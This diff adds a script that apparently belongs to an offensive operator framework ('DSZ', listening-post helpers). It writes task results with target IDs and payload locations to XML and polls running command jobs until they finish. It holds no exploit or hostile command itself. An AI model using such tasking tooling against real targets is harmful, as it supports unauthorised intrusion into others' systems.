@@ -1,0 +1,156 @@
+# Write results of tasking to xml file in TaskResults directory
+@include "_File.dsi";
+@include "_LpHelperFunctions.dsi";
+
+
+# Write results of tasking to taskResult directory (under Logs directory)
+#-----------------------------------------------------------------------
+Sub writeResults(IN STRING $resultsFile, IN STRING $taskID, IN STRING $targetID, IN STRING $dszCmd, IN STRING $location) {
+	string $resultLines;
+	bool $flag = true;
+
+	string $temp;
+	string $finalLoc;
+	if (!_GetLpLogsDirectory($temp) || !defined($temp)) {
+		return false;
+	}
+
+	# Change all back slashes in path to forward slashes
+        RegExSub("\\\\", "/", $location);
+
+	_AppendString($resultLines, "<?xml version='1.0' encoding='UTF-8' ?>\n");
+	_AppendString($resultLines, "<TaskResults taskID='$taskID' targetID='$targetID'>\n");
+	_AppendString($resultLines, "   <Commands tool='DSZ'>\n");
+
+	# since multiple command may have to be issued to satisfy one task, loop around
+	for (int $i=0; $i<sizeof($location); $i++) {
+		@regex-global on;
+      	        RegExSub("\\\\", "/", $temp);
+      	        RegExSub("\\\\", "/", $location[$i]);
+
+		_AppendString($resultLines, "      <Command>\n");
+		_AppendString($resultLines, "         <Type>$dszCmd[$i]</Type>\n");
+		_AppendString($resultLines, "         <DSZPayloadLocation>$location[$i]</DSZPayloadLocation>\n");
+		_AppendString($resultLines, "      </Command>\n");
+	}
+	_AppendString($resultLines, "   </Commands>\n");
+	_AppendString($resultLines, "</TaskResults>\n");
+	if (!WriteFile ("$resultsFile", false, $resultLines)) {
+		echo ("writeResults: Could not write to $resultsFile\n", ERROR);
+	}
+}
+
+# Determine how many jobs are still running so we can keep queue full
+#-----------------------------------------------------------------------
+Sub pollJobs (REF INT $jobs, REF INT $jobCnt) {
+	object $listCmds;
+	int $idValue;
+	string $fullcommand;
+	$jobCnt = 0;
+	string $jobsStillRunning;
+
+	@record on;
+	@echo off;
+	bool $ok = `commands`;
+	@record off;
+	@echo on;
+
+	if ($ok) {
+		if (!GetCmdData("command", $listCmds)) {
+			echo ("Failed to get command data\n", ERROR);
+			return false;
+		}
+	}
+
+	for (int $i=0; $i<sizeof($jobs); $i++) {
+		for (int $j=0; $j < sizeof($listCmds); $j++) {
+			if (!GetObjectData($listCmds[$j], "id", $idValue) || !defined($listCmds)) {
+				echo ("pollStatus: Could not get id from listCmds\n", ERROR);
+				return false;
+			}
+			if ($jobs[$i] == $idValue) {
+				$jobsStillRunning[$jobCnt] = <string>$jobs[$i];
+				$jobCnt++;
+			}
+		}
+	}
+	$jobs = 0;
+	for (int $k=0; $k<sizeof($jobsStillRunning); $k++) {
+		$jobs[$k] = <int>$jobsStillRunning[$k];
+	}
+	sleep (20000);
+}
+
+
+# Determine when all command script jobs are done by running commands every 30 secs. and comparing ids
+Sub pollStatus (REF INT $jobs, REF INT $jobCnt) {
+
+	bool $found = true;
+	object $listCmds;
+	int $idValue;
+	string $fullcommand;
+	$jobCnt = 0;
+	string $jobsStillRunning;
+
+	while ($found) {
+		$found = false;
+		echo ("\nCommands still running: \n", WARNING);
+		@record on;
+		@echo off;
+		bool $ok = `commands`;
+		@record off;
+		@echo on;
+
+		if ($ok) {
+			if (!GetCmdData("command", $listCmds)) {
+				echo ("Failed to get command data\n", ERROR);
+				return false;
+			}
+		}
+
+		# Give more compact listing of commands
+		for (int $i=0; $i < sizeof($listCmds); $i++) {
+			if (!GetObjectData($listCmds[$i], "id", $idValue) || !defined($listCmds)) {
+				echo ("pollStatus: Could not get id from listCmds\n", ERROR);
+				return false;
+			}
+			if (!GetObjectData($listCmds[$i], "fullcommand", $fullcommand) || !defined($listCmds)) {
+				echo ("pollStatus: Could not get fullcommand from listCmds\n", ERROR);
+				return false;
+			}
+			
+			bool $display=false;
+			# check to see if it's in our list
+			for (int $j=0; $j < sizeof($jobs); $j++) {
+				if ($jobs[$j] == $idValue) {
+					$display=true;
+					break;
+				}
+			}
+			
+			if ($display) {
+				echo "[$idValue]  $fullcommand";
+			}
+		}
+
+		for (int $i=0; $i<sizeof($jobs); $i++) {
+			for (int $j=0; $j < sizeof($listCmds); $j++) {
+				if (!GetObjectData($listCmds[$j], "id", $idValue) || !defined($listCmds)) {
+					echo ("pollStatus: Could not get id from listCmds\n", ERROR);
+					return false;
+				}
+				if ($jobs[$i] == $idValue) {
+					$found = true;
+					$jobsStillRunning[$jobCnt] = <string>$jobs[$i];
+					$jobCnt++;
+				}
+			}
+		}
+		if ($found) {
+			Sleep(30000);
+		}
+	}
+	echo ("Final Tasking Completed\n", GOOD);
+}
+
+
